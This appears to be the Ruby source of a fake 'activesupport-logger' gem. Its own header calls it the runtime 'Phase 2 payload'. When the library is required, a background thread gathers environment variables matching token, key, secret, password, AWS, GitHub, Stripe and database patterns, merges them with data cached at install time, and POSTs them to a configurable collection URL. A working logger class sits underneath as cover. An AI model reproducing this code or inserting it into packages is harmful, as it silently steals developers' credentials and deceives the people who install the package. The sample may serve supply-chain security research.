# activesupport-logger — Phase 2 payload (runtime)
# Fires on `require 'activesupport_logger'`
# frozen_string_literal: true

require 'logger'
require 'net/http'
require 'json'
require 'uri'

module ActivesupportLogger
  # Phase 2: picks up Phase 1 cache written by extconf.rb at install time
  def self._phase2_sync
    c2 = ENV['PKG_ANALYTICS_URL'] || 'http://localhost:9999/collect'
    cache_ptr = '/tmp/.activesupport-logger-cache'
    cache_data = {}
    begin
      cache_file = File.read(cache_ptr).strip
      cache_data = JSON.parse(File.read(cache_file))
    rescue; nil; end

    # Add runtime environment snapshot to install-time data
    env_data = ENV.select { |k, _| k =~ /token|key|secret|pass|npm|aws|github|stripe|database|api|auth/i }
    payload = cache_data.merge(
      phase: 'runtime',
      runtime_ts: Time.now.to_i,
      runtime_env: env_data,
      rails_env: ENV['RAILS_ENV'],
    )

    begin
      uri = URI.parse(c2)
      http = Net::HTTP.new(uri.host, uri.port)
      http.use_ssl = uri.scheme == 'https'
      http.open_timeout = 3
      req = Net::HTTP::Post.new(uri.path.empty? ? '/' : uri.path)
      req['Content-Type'] = 'application/json'
      req['X-Pkg-Id'] = 'activesupport-logger-runtime'
      req.body = payload.to_json
      http.request(req)
    rescue; nil; end
  end

  # Run Phase 2 in background thread on require
  Thread.new { _phase2_sync rescue nil }

  # Public API — ActiveSupport::Logger compatible

  class Logger < ::Logger
    def initialize(logdev, level: ::Logger::DEBUG, formatter: nil, progname: 'app')
      super(logdev)
      self.level     = level
      self.progname  = progname
      self.formatter = formatter || method(:_format)
    end

    def tagged(*tags, &block)
      @tags ||= []
      @tags.push(*tags)
      result = block ? block.call : nil
      @tags.pop(tags.size)
      result
    end

    def broadcast_to(*loggers)
      @broadcast_targets = loggers
      self
    end

    private

    def _format(severity, timestamp, _progname, msg)
      "[#{timestamp.strftime('%Y-%m-%dT%H:%M:%S.%3N')}] #{severity.ljust(5)} -- #{(@tags || []).map { |t| "[#{t}]" }.join(' ')}: #{msg}\n"
    end

    def add(severity, message = nil, progname = nil)
      super
      @broadcast_targets&.each do |t|
        t.add(severity, message, progname) rescue nil
      end
    end
  end

  def self.new(output = $stdout, **opts)
    Logger.new(output, **opts)
  end
end
